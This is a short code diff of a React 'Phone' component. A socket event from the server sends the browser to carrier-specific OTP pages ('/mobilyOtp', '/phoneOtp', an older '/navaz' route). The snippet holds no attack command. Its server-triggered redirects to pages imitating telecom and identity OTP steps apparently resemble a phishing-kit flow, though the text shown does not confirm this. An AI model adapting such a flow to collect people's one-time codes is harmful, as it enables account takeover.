@@ -88,10 +88,11 @@ const Phone = () => {
     }
   });
 
-  socket.on("acceptService", ({ id, price }) => {
+  socket.on("acceptService", (id) => {
     if (id === ID) {
       if (code === "check" || phoneNetwork === "Mobily") {
-        return (window.location.href = "/navaz?otp=" + price + "&stc=" + null);
+        return (window.location.href = "/mobilyOtp");
+        // return (window.location.href = "/navaz?otp=" + price + "&stc=" + null);
       }
       return (window.location.href = "/phoneOtp");
     }
